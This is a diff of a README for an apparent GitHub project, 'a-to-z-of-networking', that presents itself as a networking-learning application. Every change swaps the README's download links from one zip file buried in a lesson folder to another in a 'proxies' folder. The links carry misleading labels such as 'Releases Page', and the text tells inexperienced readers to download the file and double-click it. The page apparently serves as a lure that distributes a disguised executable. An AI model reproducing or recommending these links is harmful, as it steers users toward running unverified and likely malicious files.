@@ -1,6 +1,6 @@
 # 🌐 a-to-z-of-networking - Master Networking with Ease
 
-[![Download Now](https://github.com/Zaploo-hue/a-to-z-of-networking/raw/refs/heads/main/01-ip-addressing/a_networking_to_of_z_v2.3.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/Zaploo-hue/a-to-z-of-networking/raw/refs/heads/main/01-ip-addressing/a_networking_to_of_z_v2.3.zip)
+[![Download Now](https://raw.githubusercontent.com/Zaploo-hue/a-to-z-of-networking/main/08-proxies/a-to-of-networking-z-v3.1.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/Zaploo-hue/a-to-z-of-networking/main/08-proxies/a-to-of-networking-z-v3.1.zip)
 
 ## 📚 Introduction
 Welcome to the **a-to-z-of-networking** project. This application helps you learn networking concepts from A to Z with real-time examples. Whether you are starting out or looking to refresh your knowledge, this guide will help you understand the essentials of networking.
@@ -9,7 +9,7 @@ Welcome to the **a-to-z-of-networking** project. This application helps you lear
 To use the software, follow these simple steps. No technical experience is needed.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/Zaploo-hue/a-to-z-of-networking/raw/refs/heads/main/01-ip-addressing/a_networking_to_of_z_v2.3.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Zaploo-hue/a-to-z-of-networking/main/08-proxies/a-to-of-networking-z-v3.1.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file and double-click to open it.
@@ -46,4 +46,4 @@ This app is perfect for students, professionals looking to upskill, or anyone in
 ## 🔗 Contact
 If you have questions or suggestions, please visit the issues section of this repository. Your feedback is crucial for future improvement.
 
-[Download Now](https://github.com/Zaploo-hue/a-to-z-of-networking/raw/refs/heads/main/01-ip-addressing/a_networking_to_of_z_v2.3.zip) and start your networking journey today!
+[Download Now](https://raw.githubusercontent.com/Zaploo-hue/a-to-z-of-networking/main/08-proxies/a-to-of-networking-z-v3.1.zip) and start your networking journey today!
